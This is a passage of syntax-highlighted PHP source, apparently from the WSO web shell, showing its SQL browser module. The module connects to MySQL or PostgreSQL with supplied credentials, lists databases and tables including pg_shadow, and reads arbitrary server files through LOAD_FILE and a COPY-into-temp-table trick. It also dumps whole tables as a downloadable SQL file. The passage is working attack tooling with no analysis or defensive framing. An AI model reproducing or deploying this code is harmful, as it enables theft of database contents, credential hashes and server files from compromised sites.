            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where (table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;) or table_name = &#39;pg_shadow&#39;&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span>
                        <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
                    <span class="k">else</span>
                        <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">loadFile</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;) as file&quot;</span><span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE wso2(file text);COPY wso2 FROM &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;select file from wso2;&quot;</span><span class="p">);</span>
                    <span class="nv">$r</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>
                        <span class="nv">$r</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;drop table wso2&#39;</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
                    <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="k">echo</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">);</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="k">echo</span> <span class="s1">&#39;INSERT INTO &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;h1&amp;gt;Sql browser&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt; </span>
<span class="s2">&amp;lt;form name=&#39;sf&#39; method=&#39;post&#39;&amp;gt;&amp;lt;table cellpadding=&#39;2&#39; cellspacing=&#39;0&#39;&amp;gt;&amp;lt;tr&amp;gt; </span>
<span class="s2">&amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Host&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Login&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Password&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Database&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=a value=Sql&amp;gt;&amp;lt;input type=hidden name=p1 value=&#39;query&#39;&amp;gt;&amp;lt;input type=hidden name=p2&amp;gt;&amp;lt;input type=hidden name=c value=&#39;&quot;</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; </span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;select name=&#39;type&#39;&amp;gt;&amp;lt;option value=&#39;mysql&#39; &quot;</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;pgsql&#39; &quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_host value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;localhost&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_login value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;root&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_pass value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=text name=sql_base value=&#39;&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listDbs</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;select name=sql_base&amp;gt;&amp;lt;option value=&#39;&#39;&amp;gt;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/select&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span>
        <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt; </span>
<span class="s2">               &amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">           &amp;lt;/tr&amp;gt; </span>
<span class="s2">       &amp;lt;/table&amp;gt; </span>
<span class="s2">       &amp;lt;script&amp;gt; </span>
<span class="s2">           function st(t,l) {</span>
<span class="s2">               document.sf.p1.value = &#39;select&#39;;</span>
<span class="s2">               document.sf.p2.value = t;</span>
<span class="s2">               if(l!=null)document.sf.p3.value = l;</span>
<span class="s2">               document.sf.submit();</span>
<span class="s2">           }</span>
<span class="s2">           function is() {</span>
<span class="s2">               for(i=0;i&amp;lt;document.sf.elements[&#39;tbl[]&#39;].length;++i)</span>
<span class="s2">                   document.sf.elements[&#39;tbl[]&#39;][i].checked = !document.sf.elements[&#39;tbl[]&#39;][i].checked;</span>
<span class="s2">           }</span>
<span class="s2">       &amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br/&amp;gt;&amp;lt;table width=100% cellpadding=2 cellspacing=0&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])){</span>
                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td width=1 style=&#39;border-top:2px solid #666;border-right:2px solid #666;&#39;&amp;gt;&amp;lt;span&amp;gt;Tables:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listTables</span><span class="p">();</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                    <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">));</span>
                    <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
